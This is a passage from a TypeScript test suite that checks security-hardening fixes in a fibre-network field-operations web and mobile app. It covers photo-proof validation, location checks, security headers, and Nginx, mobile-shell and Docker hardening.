        stubMethod(prisma.attenuationHistory, 'findUnique', (async () => null) as unknown as typeof prisma.attenuationHistory.findUnique),
      );
      restoreFns.push(
        stubMethod(prisma.attenuationHistory, 'findFirst', (async () => null) as unknown as typeof prisma.attenuationHistory.findFirst),
      );
      restoreFns.push(
        stubMethod(prisma.networkSplitter, 'findFirst', (async () => ({
          id: 'sp-1',
          splitterCode: 'ODP-PLB-001',
          lat: -2.9833,
          lng: 104.7644,
          maxPorts: 8,
        })) as unknown as typeof prisma.networkSplitter.findFirst),
      );
      restoreFns.push(
        stubMethod(prisma.user, 'findUnique', (async () => null) as unknown as typeof prisma.user.findUnique),
      );
      restoreFns.push(
        stubMethod(prisma, '$transaction', (async (fn: (tx: typeof prisma) => Promise<unknown>) =>
          fn(prisma)) as unknown as typeof prisma.$transaction),
      );
      restoreFns.push(
        stubMethod(prisma.customer, 'findFirst', (async () => null) as unknown as typeof prisma.customer.findFirst),
      );
      restoreFns.push(
        stubMethod(prisma.activityLog, 'create', (async () => ({ id: 'log-1' })) as unknown as typeof prisma.activityLog.create),
      );
      restoreFns.push(
        stubMethod(prisma.ticket, 'update', (async () => ({
          id: ticketId,
          ticketNumber: 'WO-STALE-1',
          ticketType: 'PSB',
          status: 'PENDING_APPROVAL',
          createdAt: new Date(),
          customer: {
            fullName: 'Cust',
            siaNumber: '100245',
            address: 'Jl. Test',
            cluster: { name: 'Palembang', clusterCode: 'PLBHRAGA01' },
            splitter: null,
          },
          assignedTech: null,
        })) as unknown as typeof prisma.ticket.update),
      );

      const staleIso = new Date(Date.now() - 15 * 60 * 1000).toISOString();
      await assert.rejects(
        () =>
          TicketService.submitTicketByTechnician(
            ticketId,
            {
              submissionId: crypto.randomUUID(),
              splitterId: 'ODP-PLB-001',
              portNumber: 1,
              attenuationDbm: -19.5,
              photoObjectKey: 'opm-proofs/2026/02/t-1.jpg',
              submittedLat: -2.98335,
              submittedLng: 104.76445,
              isMockLocation: false,
              clientRecordedAt: staleIso,
              channel: 'MOBILE',
            },
            { id: techId, username: 'tech.andi' },
          ),
        'MOB-07: TicketService.submitTicketByTechnician must reject stale clientRecordedAt (>5 minutes old)',
      );

      await assert.rejects(
        () =>
          TicketService.submitTicketByTechnician(
            ticketId,
            {
              submissionId: crypto.randomUUID(),
              splitterId: 'ODP-PLB-001',
              portNumber: 1,
              attenuationDbm: -19.5,
              photoObjectKey: 'opm-proofs/2026/02/t-1.jpg',
              submittedLat: -2.98335,
              submittedLng: 104.76445,
              isMockLocation: false,
              clientRecordedAt: undefined,
              channel: 'MOBILE',
            },
            { id: techId, username: 'tech.andi' },
          ),
        'MOB-07: TicketService.submitTicketByTechnician must reject missing clientRecordedAt',
      );

      await assert.rejects(
        () =>
          TicketService.submitTicketByTechnician(
            ticketId,
            {
              submissionId: crypto.randomUUID(),
              splitterId: 'ODP-PLB-001',
              portNumber: 1,
              attenuationDbm: -19.5,
              photoObjectKey: 'opm-proofs/2026/02/t-1.jpg',
              submittedLat: -2.98335,
              submittedLng: 104.76445,
              isMockLocation: true,
              clientRecordedAt: new Date().toISOString(),
              channel: 'MOBILE',
            },
            { id: techId, username: 'tech.andi' },
          ),
        'MOB-07: TicketService.submitTicketByTechnician must reject isMockLocation=true',
      );
    });
  });

  it('MOB-09: removes prod fake-OPM SVG capture, burns watermark into JPEG pixels, blocks unsafe gallery formats, uses dynamic contentType, and validates JPEG magic bytes', () => {
    const modalSrc = fs.readFileSync(
      path.join(repoRoot, 'apps', 'mobile', 'src', 'components', 'OpmCameraModal.tsx'),
      'utf8',
    );
    const cameraSrc = fs.readFileSync(
      path.join(repoRoot, 'apps', 'mobile', 'src', 'camera', 'opmCamera.ts'),
      'utf8',
    );
    const submitSrc = fs.readFileSync(
      path.join(repoRoot, 'apps', 'mobile', 'src', 'screens', 'TicketSubmitScreen.tsx'),
      'utf8',
    );

    // 1. Fake-OPM SVG capture generator must not be exposed in production OpmCameraModal
    assert.doesNotMatch(
      modalSrc,
      /data:image\/svg\+xml/,
      'MOB-09: OpmCameraModal.tsx must not generate data:image/svg+xml fake OPM proofs in production',
    );

    // 2. Watermark must be burned into image pixels (Canvas / native compositor), not DOM overlay only
    assert.match(
      `${modalSrc}\n${cameraSrc}`,
      /getContext\s*\(\s*['"]2d['"]\s*\)|fillText|toDataURL\s*\(\s*['"]image\/jpeg['"]|burnWatermark|composeWatermarked/i,
      'MOB-09: OPM watermark must be burned directly into JPEG pixels via Canvas/compositor',
    );

    // 3. Gallery/file input must restrict accept types to JPEG/PNG/WebP (not wildcard image/* allowing SVG)
    assert.doesNotMatch(
      modalSrc,
      /accept\s*=\s*["']image\/\*["']/,
      'MOB-09: OpmCameraModal file input must restrict accept to image/jpeg,image/png,image/webp (not image/*)',
    );

    // 4. TicketSubmitScreen must invoke validateNonEmptyPhoto & validatePhotoSize and NOT hardcode contentType: 'image/jpeg'
    assert.match(
      submitSrc,
      /validateNonEmptyPhoto|validatePhotoSize/,
      'MOB-09: TicketSubmitScreen.tsx must invoke opmCamera photo validators before upload',
    );
    assert.doesNotMatch(
      submitSrc,
      /contentType:\s*['"]image\/jpeg['"]/,
      'MOB-09: TicketSubmitScreen.tsx must derive dynamic contentType from captured photo instead of hardcoding image/jpeg',
    );

    // 5. opmCamera runtime checks: valid JPEG passes, SVG/HTML/PNG/WebP/0-byte fail JPEG validator, >300KB fails size validator
    assert.strictEqual(opmCamera.validateNonEmptyPhoto(createMockJpegBuffer(1024)), true);
    assert.strictEqual(opmCamera.validateNonEmptyPhoto(Buffer.from('<svg></svg>')), false);
    assert.strictEqual(opmCamera.validateNonEmptyPhoto(Buffer.from('<html></html>')), false);
    assert.strictEqual(opmCamera.validateNonEmptyPhoto(Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a])), false);
    assert.strictEqual(opmCamera.validateNonEmptyPhoto(Buffer.from('RIFF\x00\x00\x00\x00WEBP')), false);
    assert.strictEqual(opmCamera.validateNonEmptyPhoto(Buffer.alloc(0)), false);
    assert.strictEqual(opmCamera.validatePhotoSize(createMockJpegBuffer(301 * 1024)).valid, false);
  });

  it('MOB-10: hardens Android manifest (allowBackup, cleartext, network_security_config), OTA code signing in app.json/eas.json, and drops iOS Always-Location', () => {
    const appJson = JSON.parse(
      fs.readFileSync(path.join(repoRoot, 'apps', 'mobile', 'app.json'), 'utf8'),
    ) as {
      expo: {
        updates?: Record<string, unknown>;
        ios?: { infoPlist?: Record<string, unknown> };
        android?: Record<string, unknown>;
        plugins?: unknown[];
      };
    };
    const easJson = JSON.parse(
      fs.readFileSync(path.join(repoRoot, 'apps', 'mobile', 'eas.json'), 'utf8'),
    ) as {
      build?: Record<string, Record<string, unknown>>;
    };

    assert.strictEqual(
      appJson.expo.android?.allowBackup,
      false,
      'MOB-10: app.json android.allowBackup must be false',
    );
    assert.strictEqual(
      appJson.expo.android?.usesCleartextTraffic,
      false,
      'MOB-10: app.json android.usesCleartextTraffic must be false',
    );
    assert.ok(
      appJson.expo.updates?.codeSigningCertificate && appJson.expo.updates?.codeSigningMetadata,
      'MOB-10: app.json expo.updates must configure codeSigningCertificate and codeSigningMetadata for signed OTA',
    );
    assert.strictEqual(
      appJson.expo.ios?.infoPlist?.NSLocationAlwaysAndWhenInUseUsageDescription,
      undefined,
      'MOB-10: iOS infoPlist must NOT request background NSLocationAlwaysAndWhenInUseUsageDescription',
    );

    // network_security_config.xml or Expo plugin configuring networkSecurityConfig must exist
    const appJsonStr = JSON.stringify(appJson);
    const hasNscPlugin = /network_security_config|networkSecurityConfig|cleartextTrafficPermitted/i.test(appJsonStr);
    const nscPaths = [
      path.join(repoRoot, 'apps', 'mobile', 'network_security_config.xml'),
      path.join(repoRoot, 'apps', 'mobile', 'android', 'app', 'src', 'main', 'res', 'xml', 'network_security_config.xml'),
      path.join(repoRoot, 'apps', 'mobile', 'plugins', 'withNetworkSecurityConfig.js'),
      path.join(repoRoot, 'apps', 'mobile', 'plugins', 'withAndroidHardening.js'),
    ];
    const existingNsc = nscPaths.find((p) => fs.existsSync(p));
    assert.ok(
      hasNscPlugin || existingNsc,
      'MOB-10: apps/mobile must configure Android network_security_config (disabling cleartext traffic) via Expo config plugin / XML',
    );
    if (existingNsc) {
      const nscContent = fs.readFileSync(existingNsc, 'utf8');
      assert.match(nscContent, /cleartextTrafficPermitted\s*=\s*["']?false|network_security_config/i);
    }

    // eas.json production profile must configure hardened OTA channel / signing / non-debuggable release
    const prodProfile = easJson.build?.production;
    assert.ok(prodProfile, 'MOB-10: eas.json must define build.production');
    assert.ok(
      typeof prodProfile.channel === 'string' && prodProfile.channel.length > 0,
      'MOB-10: eas.json build.production must specify a signed OTA channel',
    );
  });

  it('AUTH-11 + MOB-11: emits strict CSP/Permissions-Policy/poweredByHeader:false, hardens Nginx TLS/media isolation, and isolates /mobile shell', async () => {
    const nextCfgMod = await import('../../../apps/web/next.config');
    const nextCfg = nextCfgMod.default;
    assert.strictEqual(
      nextCfg.poweredByHeader,
      false,
      'AUTH-11: next.config.ts must disable X-Powered-By (poweredByHeader: false)',
    );
    assert.ok(typeof nextCfg.headers === 'function', 'next.config.ts must export async headers()');
    const headerRules = await nextCfg.headers!();
    const allHeaders = headerRules.flatMap((r) => r.headers);
    const allHeaderKeys = allHeaders.map((h) => h.key.toLowerCase());
    for (const reqHeader of [
      'content-security-policy',
      'permissions-policy',
      'x-frame-options',
      'x-content-type-options',
      'referrer-policy',
    ]) {
      assert.ok(
        allHeaderKeys.includes(reqHeader),
        `AUTH-11: next.config.ts headers() must emit ${reqHeader}`,
      );
    }

    const cspHeader = allHeaders.find((h) => h.key.toLowerCase() === 'content-security-policy')?.value ?? '';
    assert.doesNotMatch(cspHeader, /unsafe-eval/i, 'AUTH-11: CSP must not allow unsafe-eval');
    assert.match(cspHeader, /object-src\s+'none'/i, "AUTH-11: CSP must declare object-src 'none'");
    assert.match(cspHeader, /frame-ancestors\s+/i, 'AUTH-11: CSP must declare frame-ancestors');

    const nginxConf = fs.readFileSync(
      path.join(repoRoot, 'docker', 'nginx', 'nginx.conf'),
      'utf8',
    );
    assert.match(nginxConf, /server_tokens\s+off;/, 'AUTH-11: nginx.conf must set server_tokens off');
    assert.match(nginxConf, /ssl_protocols\s+TLSv1\.2\s+TLSv1\.3;/, 'AUTH-11: nginx.conf must enforce TLSv1.2 TLSv1.3');
    assert.match(nginxConf, /Strict-Transport-Security/i, 'AUTH-11: nginx.conf must set HSTS header');
    assert.match(nginxConf, /return\s+301\s+https:\/\//, 'AUTH-11: nginx.conf must redirect HTTP to HTTPS');
    assert.doesNotMatch(nginxConf, /location\s+\/s3\//, 'AUTH-02/AUTH-11: nginx.conf must remove public /s3/ generic gateway');
    const proofsBlock = nginxConf.match(/location\s+\/fiberops-proofs\/\s*\{[\s\S]*?\n\s*\}/)?.[0] || '';
    assert.match(proofsBlock, /Content-Disposition.*attachment/i, 'API-08/AUTH-11: /fiberops-proofs/ must force Content-Disposition: attachment');
    assert.match(proofsBlock, /X-Content-Type-Options.*nosniff/i, 'API-08/AUTH-11: /fiberops-proofs/ must emit X-Content-Type-Options: nosniff');
    assert.match(proofsBlock, /limit_except\s+GET\s+HEAD|if\s*\(\s*\$request_method\s*!~\s*\^\(GET\|HEAD\)/i, 'API-08/AUTH-11: /fiberops-proofs/ must block non-GET/HEAD write methods');

    // MOB-11: /mobile shell isolation from Admin HttpOnly cookies / cross-origin isolation
    const mobilePageSrc = fs.readFileSync(
      path.join(repoRoot, 'apps', 'web', 'src', 'app', 'mobile', 'page.tsx'),
      'utf8',
    );
    const mwMod = await import('../../../apps/web/src/middleware');
    const mwMatcher = Array.isArray(mwMod.config?.matcher)
      ? mwMod.config.matcher.map((m) => String(m))
      : [];
    const mwMatchesMobile = mwMatcher.some((m) => m.includes('/mobile'));
    let hasMiddlewareMobileIsolation = false;
    if (mwMatchesMobile && typeof mwMod.middleware === 'function') {
      const mobileReq = createNextRequest('http://localhost:3000/mobile', {
        method: 'GET',
        cookies: { fiberops_session: 'forged-admin-session-cookie' },
      });
      const mobileRes = await mwMod.middleware(mobileReq);
      const setCookie = mobileRes.headers.get('set-cookie') ?? '';
      const clearSiteData = mobileRes.headers.get('clear-site-data') ?? '';
      const mobileCsp = mobileRes.headers.get('content-security-policy') ?? '';
      const mobileCoop = mobileRes.headers.get('cross-origin-opener-policy') ?? '';
      const locationHdr = mobileRes.headers.get('location') ?? '';
      const isDeniedOrRedirectedOffOrigin =
        mobileRes.status === 403 ||
        mobileRes.status === 404 ||
        (mobileRes.status >= 300 &&
          mobileRes.status < 400 &&
          locationHdr.length > 0 &&
          !locationHdr.startsWith('http://localhost:3000/mobile'));
      const clearsAdminCookie =
        /cookies|storage|\*/i.test(clearSiteData) ||
        (/fiberops_session=/i.test(setCookie) && /Max-Age=0|Expires=Thu, 01 Jan 1970/i.test(setCookie));
      const enforcesMobileSandboxOrCsp =
        (/frame-ancestors\s+'none'/i.test(mobileCsp) || /\bsandbox\b/i.test(mobileCsp)) &&
        (/same-origin/i.test(mobileCoop) || /cookies/i.test(clearSiteData));
      hasMiddlewareMobileIsolation =
        isDeniedOrRedirectedOffOrigin || clearsAdminCookie || enforcesMobileSandboxOrCsp;
    }

    const hasNextConfigMobileRule = headerRules.some((rule) => {
      if (!rule.source.includes('/mobile')) return false;
      const hasClearSiteData = rule.headers.some(
        (h) => h.key.toLowerCase() === 'clear-site-data' && /cookies|storage|\*/i.test(h.value),
      );
      const hasSandboxOrFrameNoneCsp = rule.headers.some(
        (h) =>
          h.key.toLowerCase() === 'content-security-policy' &&
          (/frame-ancestors\s+'none'/i.test(h.value) || /\bsandbox\b/i.test(h.value)),
      );
      const hasCookieIsolationHeader = rule.headers.some((h) => {
        const key = h.key.toLowerCase();
        if (key === 'clear-site-data' && /cookies|storage|\*/i.test(h.value)) return true;
        if (
          key === 'set-cookie' &&
          /fiberops_session=/i.test(h.value) &&
          /Max-Age=0|Expires=Thu, 01 Jan 1970/i.test(h.value)
        ) {
          return true;
        }
        return false;
      });
      return hasClearSiteData || (hasSandboxOrFrameNoneCsp && hasCookieIsolationHeader);
    });

    const extractNginxBlocks = (conf: string, headerPattern: RegExp): string[] => {
      const blocks: string[] = [];
      const flags = headerPattern.flags.includes('g') ? headerPattern.flags : `${headerPattern.flags}g`;
      const re = new RegExp(headerPattern.source, flags);
      let match: RegExpExecArray | null;
      while ((match = re.exec(conf)) !== null) {
        let depth = 0;
        let idx = match.index + match[0].length - 1;
        for (; idx < conf.length; idx++) {
          if (conf[idx] === '{') depth++;
          else if (conf[idx] === '}') {
            depth--;
            if (depth === 0) {
              blocks.push(conf.slice(match.index, idx + 1));
              break;
            }
          }
        }
      }
      return blocks;
    };
    const stripNginxComments = (conf: string): string => conf.replace(/#.*$/gm, '');
    const nginxCleanConf = stripNginxComments(nginxConf);
    const nginxServerBlocks = extractNginxBlocks(nginxCleanConf, /\bserver\s*\{/);
    const hasDedicatedMobileServerBlock = nginxServerBlocks.some((block) => {
      const serverNameMatch = block.match(/\bserver_name\s+([^;]+);/i);
      if (!serverNameMatch) return false;
      const isolatesMobileOrigin = /(?:^|\s)(?:mobile\.|m\.|mobile-[^\s;]*|mobile(?:\s|$))/i.test(
        serverNameMatch[1].trim(),
      );
      const servesAdminApi = /\/api\/v1\/admin\b/i.test(block);
      return isolatesMobileOrigin && !servesAdminApi;
    });
    const nginxMobileLocations = extractNginxBlocks(
      nginxCleanConf,
      /\blocation\s+(?:=\s*|~\*?\s*|\^~\s*)?\/mobile(?=\s|\/|\{)[^{]*\{/,
    );
    const hasNginxMobileLocationIsolation = nginxMobileLocations.some((locBlock) =>
      /return\s+(?:301|302|403|404)\b|Clear-Site-Data|proxy_cookie_path|frame-ancestors\s+'none'/i.test(
        locBlock,
      ),
    );
    const hasNginxMobileIsolation =
      hasDedicatedMobileServerBlock || hasNginxMobileLocationIsolation;

    const hasMobilePageOriginIsolation =
      /(?:NEXT_PUBLIC_MOBILE_ORIGIN|MOBILE_ORIGIN)\b/.test(mobilePageSrc) ||
      (/fiberops_session/.test(mobilePageSrc) && /reject|redirect|403|blocked|isolated/i.test(mobilePageSrc));

    const hasMobileIsolation =
      hasMiddlewareMobileIsolation ||
      hasNextConfigMobileRule ||
      hasNginxMobileIsolation ||
      hasMobilePageOriginIsolation;

    assert.strictEqual(
      hasMobileIsolation,
      true,
      'MOB-11: /mobile web shell must enforce dedicated cookie/origin isolation from Admin Dashboard sessions (via middleware.ts, next.config.ts /mobile headers, nginx.conf, or mobile/page.tsx origin gate)',
    );
  });

  it('MOB-12: removes Math.random UUID fallback, suppresses production console logs, and auto-clears clipboard in mobile screens', () => {
    const submitSrc = fs.readFileSync(
      path.join(repoRoot, 'apps', 'mobile', 'src', 'screens', 'TicketSubmitScreen.tsx'),
      'utf8',
    );
    assert.doesNotMatch(
      submitSrc,
      /Math\.random\s*\(\)/,
      'MOB-12: TicketSubmitScreen.tsx must not use Math.random() UUID fallback',
    );

    // Production console.* suppression: babel plugin or __DEV__ guard across mobile sources
    const babelCfgPath = path.join(repoRoot, 'apps', 'mobile', 'babel.config.js');
    const babelExists = fs.existsSync(babelCfgPath);
    const babelSrc = babelExists ? fs.readFileSync(babelCfgPath, 'utf8') : '';
    const appSrc = fs.readFileSync(path.join(repoRoot, 'apps', 'mobile', 'App.tsx'), 'utf8');
    const hasProdConsoleGuard =
      /transform-remove-console/.test(babelSrc) ||
      (/__DEV__|NODE_ENV\s*===\s*['"]production['"]/.test(appSrc) && /console\.(log|warn|debug)\s*=/.test(appSrc));
    assert.strictEqual(
      hasProdConsoleGuard,
      true,
      'MOB-12: apps/mobile must suppress console.* output in production builds (babel transform-remove-console or prod console guard)',
    );

    // Clipboard auto-clear in TicketListScreen.tsx after copying SIA
    const listSrc = fs.readFileSync(
      path.join(repoRoot, 'apps', 'mobile', 'src', 'screens', 'TicketListScreen.tsx'),
      'utf8',
    );
    const copySiaBlock = listSrc.match(/const handleCopySia[\s\S]*?\n  \};/)?.[0] || '';
    assert.match(
      copySiaBlock,
      /clipboard\.writeText\s*\(\s*['"]['"]\s*\)/,
      'MOB-12: TicketListScreen.tsx handleCopySia must auto-clear clipboard after timeout',
    );
  });

  it('AUTH-12: hardens docker-compose.yml (Redis password & healthcheck, non-root MinIO, pinned tags, no-new-privileges, cap_drop) and standalone Dockerfile', () => {
    const composeSrc = fs.readFileSync(
      path.join(repoRoot, 'docker', 'docker-compose.yml'),
      'utf8',
    );
    const dockerfileSrc = fs.readFileSync(
      path.join(repoRoot, 'apps', 'web', 'Dockerfile'),
      'utf8',
    );
    const nextCfgSrc = fs.readFileSync(
      path.join(repoRoot, 'apps', 'web', 'next.config.ts'),
      'utf8',
    );

    assert.doesNotMatch(composeSrc, /:\s*latest\b/i, 'AUTH-12: docker-compose.yml must not use :latest tags');
    assert.doesNotMatch(composeSrc, /user:\s*root\b/i, 'AUTH-12: docker-compose.yml must not run minio as user: root');
    assert.match(composeSrc, /--requirepass/, 'AUTH-12: Redis in docker-compose.yml must require authentication (--requirepass)');
    assert.match(composeSrc, /REDIS_URL=redis:\/\/:[^@\s]+@redis:6379/, 'AUTH-12: REDIS_URL must include Redis password');
    assert.match(composeSrc, /REDISCLI_AUTH|redis-cli[\s\S]{0,40}-a\s+/, 'AUTH-12: Redis healthcheck must authenticate with password');
    assert.match(composeSrc, /no-new-privileges:\s*true/, 'AUTH-12: docker-compose.yml must enable no-new-privileges:true');
    assert.match(composeSrc, /cap_drop:\s*\n\s*-\s*ALL/, 'AUTH-12: docker-compose.yml must drop all capabilities (cap_drop: ALL)');
    assert.match(dockerfileSrc, /HEALTHCHECK/i, 'AUTH-12: apps/web/Dockerfile must define HEALTHCHECK');
    assert.match(nextCfgSrc, /output:\s*['"]standalone['"]/, 'AUTH-12: next.config.ts must enable output: "standalone"');
    assert.match(dockerfileSrc, /standalone/, 'AUTH-12: apps/web/Dockerfile must copy Next.js standalone bundle instead of writable node_modules');
  });
});
